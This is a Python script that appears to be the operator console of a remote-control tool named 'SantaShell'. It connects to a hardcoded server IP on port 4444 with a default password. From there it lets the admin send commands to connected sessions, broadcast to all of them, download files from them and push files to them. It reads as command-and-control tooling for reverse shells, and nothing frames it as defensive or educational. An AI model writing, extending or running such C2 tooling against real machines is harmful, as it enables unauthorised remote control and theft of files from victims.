from datetime import date
import socket
import threading

HOST = '93.155.219.210'  # server IP address
PORT = 4444             # server port
BUFFER = 1024 * 128 * 1000
FORMAT = 'ascii'
interaction = False
broadcasting = False
UPLOAD_FAILURE = False  # if the UPLOADING fail it sets to True and tells the admin

import subprocess
import platform
if platform.platform()[0:7] == 'Windows':
    subprocess.call('cls', shell=True) 
    subprocess.call('color a', shell=True)
elif platform.platform()[0:5] == 'Linux':
    subprocess.call('clear', shell=True)


nickname = 'admin'
if nickname == 'admin':
    print('[SantaShell]~[Santa v1.1.0 Catbird Seat]')
    # password = input('passwd: ')  # to set a password
    password = '1337'  # default password that the server will use

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

stop_thread = False

def receive():
    global interaction, interacting_with, download_filename
    while True:
        global stop_thread
        if stop_thread:
            break
        try:
            message = client.recv(BUFFER).decode(FORMAT)
            if message == 'NICK':
                client.send(nickname.encode(FORMAT))
                next_message = client.recv(1024).decode(FORMAT)
                if next_message == 'PASS':
                    client.send(password.encode(FORMAT))
                    if client.recv(1024).decode(FORMAT) == 'refuse':  # if the server receive a wrong password it sends 'refuse' message to trigger this function
                        print('\n\n[-] Authenication error')
                        stop_thread = True  # program exits
            
            if message[0:5] == '|*|*|':  # this is a message header, when received - interaction sets to True
                interaction = True
                interacting_with = message[5:]
            elif message[0:21] == '|d0wnl0ad-msg-head3r|':   # this message header tells the admin that he needs to save a file. This is triggered by 'download'
                if message[21:] != '\n[-] File not found\n':    
                    with open(download_filename, 'w') as file:
                        file.write(message[21:])  # which is the content
                        file.close()
                        print('\n[+] File was successfully downloaded\n')
                else: print(message[21:])  # which is the error message

            else:
                pass

            if len(message) > 0 and message != 'NICK' and message[0:5] != '|*|*|' and message != 'exited' and message[0:5] != '*|*|*' and message[0:21] != '|d0wnl0ad-msg-head3r|':
                print(message)



            elif message == 'exited':
                exit()
        except:
            print("error")
            client.close()
            break


def write():
    global interaction, interacting_with, broadcasting, download_filename, UPLOAD_FAILURE
    while True:
        if stop_thread:
            break

        if broadcasting == False:
            if interaction == False:
                input_msg = '[SantaShell] > '
            else:
                input_msg = interacting_with + ' > '
        else:
            input_msg = '[Broadcast] > '


        try: 
            # TODO: when the message is received; do this
            import time
            time.sleep(0.5)  # Quick fix: the output is received after this so 0.5s lock reduces 50% of this causes # TODO: fix this
            message = input(input_msg)

            if message[0:4] == 'time':
                import datetime
                now = datetime.datetime.now()
                print(f'\n[@] Admin: {str(now.strftime("%H:%M:%S.%f"))}')  # '\n' is not needed at the end

            elif message[0:8] == 'interact':
                if message[9:] == 'broadcast': broadcasting = True
                else: broadcasting = False

            elif message[0:8] == 'download':
                download_filename = message[9:]

            elif message[0:6] == 'upload':
                upload_filename = message[7:]
                try:
                    check_for_index_error = message.split(" ")
                    if len(check_for_index_error) == 1:  # checks if the "upload" command has lenght equal to 1; if yes => It raises error and tells the admin about the error. (The program won't crash)
                        raise IndexError
                    with open(upload_filename, 'r') as file:
                        file_contents = file.read()
                        file.close()
                except IndexError:  # Exception, Error NO 1 - arguments were not specified
                    print('\n[-] No arguments were specified\n')
                    UPLOAD_FAILURE = True
                except FileNotFoundError:  # Exception, Error NO 2 - file that you are trying to upload does not exist
                    print('\n[-] File not found\n')
                    UPLOAD_FAILURE = True

                if UPLOAD_FAILURE != True:  # if this is not set to True = no errors found; sends message
                    message = 'upload'
                    upload_msg = f'upload {upload_filename} {str(file_contents)}'
                else: message = ''  # sets the message to an empty string so the ADMIN cannot send anything if any error occur (Error message will be displayed)
        except ValueError: exit()  # when the "exit" command is executed it raises this error

    
        if message == 'cls' or message == 'clear':
            if platform.platform()[0:7] == 'Windows':
                subprocess.call('cls', shell=True) 
            elif platform.platform()[0:5] == 'Linux':
                subprocess.call('clear', shell=True)
            else:
                print('\n[-] Unknown platform\n')

        elif message == 'upload':
            client.send(upload_msg.encode(FORMAT))

        else:
            try:
                client.send(message.encode(FORMAT))
                if message == 'exit':
                    exit()
            except:
                if message != 'exit':
                    print("\n[-] The server is not responding\n")
                else: print('\n[i] Exited\n')

receive_thread = threading.Thread(target=receive)
receive_thread.start()

write_thread = threading.Thread(target=write)
write_thread.start()




